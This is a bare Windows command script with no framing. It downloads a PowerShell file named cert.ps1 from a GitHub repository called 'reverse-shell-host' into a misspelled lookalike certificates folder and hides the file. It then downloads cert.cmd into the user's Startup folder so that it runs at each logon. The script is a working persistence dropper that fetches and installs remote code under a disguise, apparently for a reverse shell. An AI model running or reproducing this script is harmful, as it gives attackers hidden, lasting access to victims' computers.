cd %AppData%\Microsoft\Windows\SystenCertificates\My\Certificates
curl https://raw.githubusercontent.com/reverse-shell-host/host/main/cert.ps1 -O
attrib +h cert.ps1
cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
curl https://raw.githubusercontent.com/reverse-shell-host/host/main/cert.cmd -O
cd %UserProfile%

